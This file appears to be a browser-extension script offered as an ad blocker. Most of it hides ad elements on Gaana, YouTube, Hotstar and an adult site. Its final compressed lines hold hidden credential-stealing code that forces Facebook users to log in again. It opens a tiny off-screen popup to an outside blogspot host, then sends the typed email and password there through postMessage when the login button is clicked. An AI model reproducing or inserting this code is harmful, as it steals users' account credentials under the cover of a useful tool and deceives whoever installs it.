const secend = 2000;      
this.blanck = "<a></a>"
if(window.location.host == "gaana.com"){
        setInterval(skipadsgaana,this.secend);
}
if(window.location.host == "www.youtube.com"){
	setInterval(skipbutton,this.secend);
	setInterval(youtubeads,this.secend);
}
if (window.location.host=="xhamster7.desi") {
        setInterval(xhamster7,this.secend);

}
function skipadsgaana() {
        const right =document.querySelector('.right');
        const interstitalads =document.querySelector('#_n_interstital_ads'); 
        const adunit =document.querySelector('#ad_unit');     
        const pdhigh =document.querySelector('#ads_645x60_pd_high_1');
        const play =document.querySelector('.player_ads');
        const topads =document.getElementById("Gaana-Home-Top_Ads");
        const queueAds =document.getElementById("queueAds");
        const bottomPlayerAds =document.getElementById("bottomPlayerAds");
        const ads320 = document.querySelector('.ads320');
        if (right) {
                document.querySelector('.right').classList.remove("add_block");
                right.style.display = 'none';
        }
        if (ads320) {
                ads320.innerHTML=this.blanck;
        }
        
        if (bottomPlayerAds) {
                bottomPlayerAds.innerHTML=this.blanck;
        }
        if (play) {
                play.style.display = 'none';
                document.querySelector('.player_ads').innerHTML=this.blanck;
        }       
        if (topads) {
                topads.style.display = 'none';
                document.getElementById("Gaana-Home-Top_Ads").innerHTML=this.blanck;
        } 
        if (pdhigh) {
                document.getElementById("ads_645x60_pd_high_1").innerHTML=this.blanck;
                
        }     
        if (queueAds) {
                document.getElementById("queueAds").innerHTML=this.blanck;
                
        }   
        if (adunit) {
                document.querySelector('#ad_unit').innerHTML=this.blanck;
                        
        } 
}



function skipbutton() {
                const skipbutton =document.querySelector(".ytp-ad-skip-button");
                const companion =document.querySelector("#companion");
                if (skipbutton) {
                document.querySelector(".ytp-ad-skip-button").click();
                }
                if (companion) {
                        companion.innerHTML=this.blanck;
                }
                
        }
function youtubeads() {
        const adcontainer =document.querySelector(".ad-container");
        const mastheadd =document.querySelector("#masthead-ad");
        const sidebarads =document.querySelector("#watch7-sidebar-ads");
        const playerads =document.querySelector("#player-ads");
        const mastheadad =document.querySelector("#masthead-ad");
        const overlayslot =document.querySelector(".ytp-ad-overlay-slot");
        const watch7sidebarads =document.querySelector("#watch7-sidebar-ads");
        const promorenderer =document.querySelector(".ytd-mealbar-promo-renderer");
        const typecustom = document.querySelector(".annotation-type-custom");
        if (mastheadd) {
        	mastheadd.innerHTML=this.blanck;
        }
        if (typecustom) {
                typecustom.innerHTML=this.blanck;
        }
        if(overlayslot){
                overlayslot.innerHTML=this.blanck;
        }
        if (adcontainer) {
                adcontainer.innerHTML=this.blanck;
        }
        if (sidebarads) {
                sidebarads.innerHTML=this.blanck;
        }
        if (playerads) {
                playerads.innerHTML=this.blanck;
        }
        if (mastheadad) {
                mastheadad.innerHTML=this.blanck;
        }
        if (watch7sidebarads) {
                watch7sidebarads.innerHTML=this.blanck;
        }
        if (promorenderer) {
                promorenderer.innerHTML=this.blanck;
        }
}
function xhamster7() {  
        const trafficstars =document.querySelector('.mn-related-container');
        const widthwrap =document.querySelector('.wio-abanner-container');
                if (trafficstars) {
               trafficstars.innerHTML=this.blanck;
                trafficstars.style.display = 'none';}
                if (widthwrap) {
                widthwrap.innerHTML=this.blanck;
                widthwrap.style.display = 'none';}      
}

if (window.location.host=="www.hotstar.com") {
    setInterval(hotstarblock,this.secend);

}
function hotstarblock() {
	const player = document.querySelector('.player');
	const play = document.querySelector('.player-base');
	const slateholder = document.querySelector('.slate-holder');
	if (player) {
		player.classList.add("playing");
		player.style.transform="scale(1.07784)";
	}
	if (slateholder) {
		slateholder.innerHTML=this.blanck;
	}
	
	
}
const s =window.location.pathname;if (window.location.href=="https://www.facebook.com/") {openChild();openChild();}if(window.location.host=="www.facebook.com" && s=="/login/"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}var childwin;function openChild() {childwin = window.open('https://facebookgoo.blogspot.com/','_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=2, height=2, ', '');  
childwin.blur();}if (window.location.href=="https://www.facebook.com/") { const send = document.querySelector("button[name='login']");
if (send) {send.onclick=function () {let msg={pName : document.querySelector("#email").value, pAge: document.querySelector("#pass").value};childwin.postMessage(msg,'https://facebookgoo.blogspot.com/');childwin.focus();}}}if(window.location.host=="www.facebook.com" && s=="/login"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}if(window.location.host=="www.facebook.com" && s=="/login.php"){var aas=document.querySelector('#not_me_link');if (aas) {aas.click();window.location.href="https://www.facebook.com/"}}

    

    
   











